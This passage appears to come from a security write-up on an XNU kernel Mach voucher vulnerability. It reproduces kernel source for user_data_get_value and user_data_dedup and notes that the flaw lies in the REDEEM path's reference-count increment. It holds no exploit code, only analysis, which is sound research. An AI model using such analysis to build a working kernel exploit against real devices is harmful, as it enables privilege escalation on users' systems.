 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __assert_only key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_recipe_command_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_array_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;prev_values</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_array_size_t &nbsp; &nbsp; prev_value_count</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_size_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_flags_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_flags</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value_voucher</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_element_t elem</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">user_data_manager </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;manager</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; USER_DATA_ASSERT_KEY</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* never an out voucher */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value_voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;IPC_VOUCHER_NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_flags </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_NONE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">switch</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">command</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">case</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_REDEEM</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* redeem of previous values is the value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;prev_value_count</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">user_data_element_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">prev_values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;prev_values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* redeem of default is default */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">case</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">USER_DATA_MAX_DATA </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_RESOURCE_SHORTAGE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* empty is the default */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;user_data_dedup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">out_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_value_handle_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">default</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* every other command is unknown */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_INVALID_ARGUMENT</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s look at the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span>&nbsp;case, which is the command we put in our single sub-recipe. (The vulnerability is in the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>&nbsp;code above but we need a lot more background before we get to that.) In the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span>&nbsp;case the input arbitrary byte buffer is passed to </span><span class="BGLtzooHlW-c11">user_data_dedup</span><span>, then that return value is returned as the value of </span><span class="BGLtzooHlW-c11">out_value</span><span>. Here&#39;s </span><span class="BGLtzooHlW-c11">user_data_dedup</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.7bb6adaf52c18b6e3e2890205d992e9ab2854f2f"></a><a id="t.28"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;user_data_element_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">user_data_dedup</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_size_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t sum</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_element_t elem</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_element_t alloc </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; sum </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;user_data_checksum</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; hash </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;USER_DATA_HASH_BUCKET</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">sum</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">retry</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_lock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; queue_iterate</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">user_data_bucket</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash</span><span class="BGLtzooHlW-c2">],</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;user_data_element_t</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;e_hash_link</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_hash </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;hash</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* if sums match... */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_sum </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;sum </span><span class="BGLtzooHlW-c2">&amp;&amp;</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_size </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iv_index_t i</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* and all data matches */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">for</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">i </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i</span><span class="BGLtzooHlW-c2">++)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_data</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">i</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;content</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">i</span><span class="BGLtzooHlW-c2">])</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">i </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">continue</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* ... we found a match... */</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
